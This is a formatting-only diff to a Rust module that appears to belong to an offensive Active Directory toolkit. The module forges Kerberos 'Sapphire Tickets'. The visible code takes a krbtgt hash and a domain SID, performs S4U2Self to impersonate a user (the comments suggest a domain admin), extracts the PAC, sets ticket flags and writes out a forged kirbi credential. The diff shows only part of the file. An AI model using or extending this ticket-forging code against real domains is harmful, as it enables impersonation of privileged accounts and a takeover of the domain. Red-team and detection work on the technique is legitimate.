@@ -15,10 +15,14 @@
 //! original user — so the technique works best when the user we S4U2Self-for is already a DA.
 
 use chrono::{Duration, Utc};
-use kerberos_asn1::{Asn1Object, EncTicketPart, EncryptedData, PrincipalName, Ticket, TransitedEncoding};
+use kerberos_asn1::{
+    Asn1Object, EncTicketPart, EncryptedData, PrincipalName, Ticket, TransitedEncoding,
+};
 use kerberos_crypto::new_kerberos_cipher;
 use overthrone_core::error::{OverthroneError, Result};
-use overthrone_core::proto::kerberos::{self, ETYPE_AES256_CTS, ETYPE_RC4_HMAC, NT_PRINCIPAL, NT_SRV_INST};
+use overthrone_core::proto::kerberos::{
+    self, ETYPE_AES256_CTS, ETYPE_RC4_HMAC, NT_PRINCIPAL, NT_SRV_INST,
+};
 use tracing::info;
 
 use crate::golden;
@@ -34,9 +38,7 @@ pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> 
         .as_deref()
         .or(config.krbtgt_aes256.as_deref())
         .ok_or_else(|| {
-            OverthroneError::TicketForge(
-                "krbtgt hash is required for Sapphire Ticket".into(),
-            )
+            OverthroneError::TicketForge("krbtgt hash is required for Sapphire Ticket".into())
         })?;
 
     let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
@@ -71,12 +73,7 @@ pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> 
 
     // Step 2: S4U2Self to get a service ticket for the impersonate user
     info!("[sapphire] Step 2: S4U2Self as {impersonate}");
-    let s4u2_self = kerberos::s4u2self(
-        &config.dc_ip,
-        &user_tgt,
-        impersonate,
-    )
-    .await?;
+    let s4u2_self = kerberos::s4u2self(&config.dc_ip, &user_tgt, impersonate).await?;
 
     info!(
         "[sapphire] S4U2Self ticket obtained (ticket etype: {})",
@@ -183,12 +180,8 @@ pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> 
     };
 
     let ticket_bytes = forged_ticket.build();
-    let kirbi_bytes = golden::build_krb_cred(
-        &forged_ticket,
-        &new_enc_ticket,
-        &session_key,
-        krbtgt_etype,
-    )?;
+    let kirbi_bytes =
+        golden::build_krb_cred(&forged_ticket, &new_enc_ticket, &session_key, krbtgt_etype)?;
     let kirbi_path = golden::save_ticket(config, &kirbi_bytes, "sapphire")?;
     let etype_str = golden::etype_name(krbtgt_etype);
 
@@ -228,21 +221,15 @@ pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> 
 }
 
 fn ticket_flags_sapphire() -> kerberos_asn1::KerberosFlags {
-    kerberos_asn1::KerberosFlags {
-        flags: 0x40E00000,
-    }
+    kerberos_asn1::KerberosFlags { flags: 0x40E00000 }
 }
 
 fn derive_user_key(password: &str, etype: i32) -> Result<Vec<u8>> {
     match etype {
-        ETYPE_RC4_HMAC => {
-            Ok(overthrone_core::proto::ntlm::nt_hash(password))
-        }
-        ETYPE_AES256_CTS | 17 => {
-            Err(OverthroneError::TicketForge(
-                "AES key derivation from password not yet supported — use RC4 (etype 23)".into(),
-            ))
-        }
+        ETYPE_RC4_HMAC => Ok(overthrone_core::proto::ntlm::nt_hash(password)),
+        ETYPE_AES256_CTS | 17 => Err(OverthroneError::TicketForge(
+            "AES key derivation from password not yet supported — use RC4 (etype 23)".into(),
+        )),
         _ => Err(OverthroneError::TicketForge(format!(
             "Unsupported etype: {etype}"
         ))),
@@ -255,9 +242,7 @@ fn extract_pac(enc_ticket: &EncTicketPart) -> Result<Vec<u8>> {
         .as_ref()
         .and_then(|d| d.first())
         .ok_or_else(|| {
-            OverthroneError::TicketForge(
-                "No authorization-data found in S4U2Self ticket".into(),
-            )
+            OverthroneError::TicketForge("No authorization-data found in S4U2Self ticket".into())
         })?;
 
     Ok(auth_data.ad_data.clone())
